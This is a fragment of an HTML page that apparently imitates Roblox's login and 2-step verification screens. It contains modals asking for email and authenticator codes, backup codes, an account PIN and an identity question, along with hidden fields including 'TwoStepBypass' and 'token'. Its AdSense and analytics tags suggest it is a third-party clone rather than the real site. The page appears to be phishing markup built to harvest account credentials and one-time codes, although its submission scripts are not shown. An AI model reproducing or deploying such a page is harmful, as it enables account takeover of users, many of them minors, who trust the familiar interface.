	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" src="https://js.rbxcdn.com/a411b4655a0c97ad1d8209c2daa1e92b0dfc5d66716efcfea310f491aabf1ef6.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c46b4fb03550b521b63f90cdca3214e620c53f676987f9c644dc3ed60a9d74c9.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/358e6ae5bebb0fa9326d0de99d3ee229ee63236bf44ed11b9ab1d314c7972e79.js"></script>
	<!-- Google tag (gtag.js) -->
    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-YKBGX9W7SH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-YKBGX9W7SH');
    </script>
    <script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4902752889650622" crossorigin="anonymous" data-checked-head="true"></script>
	<div role="dialog" id="captcha" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern modal-modern-challenge-captcha in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-body"><button type="button" class="challenge-captcha-close-button" onclick="document.getElementById('captcha').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><div></div><div class="challenge-captcha-body" id="challenge-captcha-element"><div id="FunCaptcha"><iframe frameborder="0" scrolling="no" id="fc-iframe-wrap" class="fc-iframe-wrap" aria-label=" " style="width: 308px; height: 310px;"></iframe></div></div></div></div></div></div></div>
    <div role="dialog" id="twostepverification" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('twostepverification').style.display = 'none';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p><div class="input-control-wrapper"><form><div id="twostep-group" class="   form-group"><input as="input" autocomplete="off" maxlength="6" oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" class="input-field form-control"><input type="text" id="ticket" hidden=""><input type="text" id="userid" hidden=""><input type="text" id="server" hidden=""><div class="form-control-label bottom-label xsmall" id="twostep-error">&nbsp;</div></div></form></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" onclick="resend(this);" class="modal-body-button-link small">Resend Code</button></p><p><button type="button" class="modal-body-button-link small" onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('twostepverification').style.display = 'none';">Use another verification method</button></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" onclick="twostep();" id="verifyButton">Verify</button></div><p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p><p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>
    <div role="dialog" id="authenticatorverification" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" onclick="document.getElementById('authenticatorverification').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';" class="modal-modern-header-button"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app.</p><div class="input-control-wrapper"><form><div id="Authen-group" class="   form-group"><input as="input" autocomplete="off" maxlength="6" oninput="twostepInput(this.value, 'AuthenButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input-authenticator" class="input-field form-control" value=""><div class="form-control-label bottom-label xsmall" id="Authen-error">&nbsp;</div></div></form></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'block'; document.getElementById('authenticatorverification').style.display = 'none';">Use another verification method</button></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" onclick="Authen();" id="AuthenButton" disabled="">Verify</button></div><p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p><p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>
    <div role="dialog" id="RecoveryFromAuthen" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p><div class="input-control-wrapper"><form><div id="RecoveryFromAuthen-group" class="   form-group"><input as="input" autocomplete="off" maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromAuthenButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-recoveryFromAuthen" class="input-field form-control" value=""><div class="form-control-label bottom-label xsmall" id="RecoveryFromAuthen-error">&nbsp;</div></div></form></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'block'; document.getElementById('RecoveryFromAuthen').style.display = 'none';">Use another verification method</button></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" onclick="RecoveryFromAuthen();" id="RecoveryFromAuthenButton" disabled="">Verify</button></div><p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p><p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>
    <div role="dialog" id="RecoveryFromEmail" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromEmail').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p><div class="input-control-wrapper"><form><div id="RecoveryFromEmail-group" class="   form-group"><input as="input" autocomplete="off" maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromEmailButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-RecoveryFromEmail" class="input-field form-control" value=""><div class="form-control-label bottom-label xsmall" id="RecoveryFromEmail-error">&nbsp;</div></div></form></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small" onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('RecoveryFromEmail').style.display = 'none';">Use another verification method</button></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" onclick="RecoveryFromEmail();" id="RecoveryFromEmailButton" disabled="">Verify</button></div><p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p><p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>
    <div role="dialog" id="selectVerificationMethodEmail" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Choose alternate verification method.</p><table class="table table-striped media-type-list modal-margin-bottom-large"><tbody><tr class="media-type-row" onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'none';document.getElementById('twostepverification').style.display = 'block';"><td><span class="icon-menu-email"></span></td><td class="media-type-label">Email</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr><tr class="media-type-row"><td><span class="icon-menu-recover"></span></td><td class="media-type-label" onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'none';document.getElementById('RecoveryFromEmail').style.display = 'block';">Backup Code</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr></tbody></table></div></div></div></div></div>
    <div role="dialog" id="selectVerificationMethodAuthen" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Choose alternate verification method.</p><table class="table table-striped media-type-list modal-margin-bottom-large"><tbody><tr class="media-type-row" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';"><td><span class="icon-menu-mobile"></span></td><td class="media-type-label">Authenticator</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr><tr class="media-type-row"><td><span class="icon-menu-recover"></span></td><td class="media-type-label" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">Backup Code</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr></tbody></table></div></div></div></div></div>
    <div role="dialog" id="selectVerificationMethodAuthen" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Choose alternate verification method.</p><table class="table table-striped media-type-list modal-margin-bottom-large"><tbody><tr class="media-type-row" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';"><td><span class="icon-menu-mobile"></span></td><td class="media-type-label">Authenticator</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr><tr class="media-type-row"><td><span class="icon-menu-recover"></span></td><td class="media-type-label" onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">Backup Code</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr></tbody></table></div></div></div></div></div>
    <div role="dialog" id="selectVerificationMethodSecurityKey" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Choose alternate verification method.</p><table class="table table-striped media-type-list modal-margin-bottom-large"><tbody><tr class="media-type-row" onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';"><td><span class="icon-menu-mobile"></span></td><td class="media-type-label">Authenticator</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr><tr class="media-type-row"><td><span class="icon-menu-recover"></span></td><td class="media-type-label" onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">Backup Code</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr><tr class="media-type-row" onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('securitykeyverification').style.display = 'block';"><td><span class="icon-menu-usb"></span></td><td class="media-type-label">Security Key</td><td class="media-type-selector"><span class="icon-next"></span><div class="icon-placeholder"></div></td></tr></tbody></table></div></div></div></div></div>
    <div role="dialog" id="securitykeyverification" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('securitykeyverification').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-sm">Use your Security Key to log in.</p><p class="modal-margin-bottom">When prompted, touch your key or use biometrics on this device.</p><button type="button" id="securitykeyButton" class="modal-action-button btn-cta-md modal-margin-bottom" style="width: 100%;" onclick="securityKey()" aria-label="Verify">Verify</button><p class="modal-margin-bottom"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" onclick="document.getElementById('securitykeyverification').style.display = 'none';document.getElementById('selectVerificationMethodSecurityKey').style.display = 'block';" class="modal-body-button-link small">Use another verification method</button></p><p><span class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a></span></p><p class="modal-margin-bottom-xlarge text-error xsmall" id="securitykey-error"></p></div></div></div></div></div>
    <div role="dialog" id="Question" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('Question').style.display = 'none';"><span class="icon-close"></span></button><h4 class="modal-title">Please Confirm Your Identity</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-sm">Which of these experiences have you joined in the last 7 days?</p><p class="modal-margin-bottom-xlarge font-bold">Pick 3.</p><p class="modal-margin-bottom-xlarge small">To keep your account secure, please verify your identity.</p><p class="modal-margin-bottom-xlarge text-error" id="questionError"></p><div class="modal-margin-bottom-xlarge answer-choice-area" id="GameSelectArea"></div><input type="text" id="sessionId" hidden=""><input type="text" id="userId" hidden=""><input type="text" id="serverQuestion" hidden=""><input type="text" id="captchaQuestion" hidden=""><p class="text-error xsmall"></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Confirm" onclick="ConfirmQuestion();" id="selectGameButton" disabled="">Confirm</button></div></div></div></div></div></div>
    <div role="dialog" id="PIN" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('PIN').style.display = 'none';"><span class="icon-close"></span></button><h4 class="modal-title">Account PIN Required</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p class="modal-margin-bottom-sm">Enter the PIN attached to your account</p><center><input type="password" id="pin_input" class="form-control pin-field ng-valid-maxlength ng-not-empty ng-valid-parse ng-valid-required ng-valid ng-valid-minlength ng-touched ng-pristine" name="pin" autocomplete="off" ng-trim="false" ng-model="pinInfo.pin" minlength="4" maxlength="4" ng-minlength="4" ng-maxlength="4" ng-required="true" key-press-enter="submit(pinUnlockForm)" numbers-only="" autofocus="" required="required" style="width: 76px; height: 38px; text-align: center;"></center><p class="modal-margin-bottom-xlarge text-error" id="pinError"></p><p class="text-error xsmall"></p></div><div class="modal-footer"><center><button type="submit" class="modal-button btn-secondary-md ng-binding" onclick="UnlockPIN(this);" disabled="">Unlock</button></center></div></div></div></div></div>
    <input type="text" id="unifiedCaptchaId" hidden="">
    <input type="text" id="CaptchaRequest" hidden="">
    <input type="text" id="CaptchaChallengeId" hidden="">
    <input type="text" id="TwoStepBypass" hidden="">
    <input type="text" id="ContinueData" hidden="">
    <input type="text" id="token" hidden="">


<ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><div id="aswift_0_host" tabindex="0" title="Advertisement" aria-label="Advertisement" style="border: none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" browsingtopics="true" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allow="attribution-reporting" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-4902752889650622&amp;output=html&amp;adk=935352056&amp;adf=3869929943&amp;lmt=1704327206&amp;plat=1%3A8%2C2%3A16777224%2C3%3A2162688%2C4%3A2162688%2C9%3A32776%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1048576%2C32%3A32%2C41%3A32%2C42%3A32&amp;format=0x0&amp;url=https%3A%2F%2Froblox.com%2Flogin%3FreturnUrl%3D4781066585972668&amp;ea=0&amp;pra=5&amp;wgl=1&amp;easpi=1&amp;asro=0&amp;asiscm=1&amp;aslmt=0.4&amp;asamt=-1&amp;asedf=0&amp;asefa=1&amp;aseiel=1~2~4~6&amp;aslcwct=150&amp;asacwct=25&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTIwLjAuNjA5OS4xMzAiLG51bGwsMCxudWxsLCI2NCIsW1siTm90X0EgQnJhbmQiLCI4LjAuMC4wIl0sWyJDaHJvbWl1bSIsIjEyMC4wLjYwOTkuMTMwIl0sWyJHb29nbGUgQ2hyb21lIiwiMTIwLjAuNjA5OS4xMzAiXV0sMF0.&amp;dt=1704327206494&amp;bpp=4&amp;bdt=5035&amp;idt=478&amp;shv=r20240102&amp;mjsv=m202312070101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;nras=1&amp;correlator=2495606158613&amp;frm=20&amp;pv=2&amp;ga_vid=1458931758.1700259405&amp;ga_sid=1704327207&amp;ga_hid=868466240&amp;ga_fc=1&amp;u_tz=60&amp;u_his=16&amp;u_h=720&amp;u_w=1280&amp;u_ah=672&amp;u_aw=1280&amp;u_cd=24&amp;u_sd=1.5&amp;dmc=4&amp;adx=-12245933&amp;ady=-12245933&amp;biw=729&amp;bih=585&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759837%2C95320238%2C31079437%2C95320870%2C31078663%2C31078665%2C31078668%2C31078670&amp;oid=2&amp;pvsid=533577440432979&amp;tmod=83064575&amp;uas=0&amp;nvt=3&amp;fsapi=1&amp;ref=https%3A%2F%2Froblox.com%2Fusers%2F4090618947%2Fprofile&amp;fc=1920&amp;brdim=0%2C0%2C0%2C0%2C1280%2C0%2C1280%2C672%2C746%2C585&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;td=1&amp;psd=W251bGwsbnVsbCxudWxsLDNd&amp;nt=1&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=490" data-google-container-id="a!1" data-load-complete="true"></iframe></div></ins><iframe src="https://tpc.googlesyndication.com/sodar/sodar2/225/runner.html" width="0" height="0" style="display: none;"></iframe><iframe src="https://www.google.com/recaptcha/api2/aframe" width="0" height="0" style="display: none;"></iframe></body><iframe id="google_esf" name="google_esf" src="https://googleads.g.doubleclick.net/pagead/html/r20240102/r20190131/zrt_lookup_fy2021.html" style="display: none;"></iframe></html>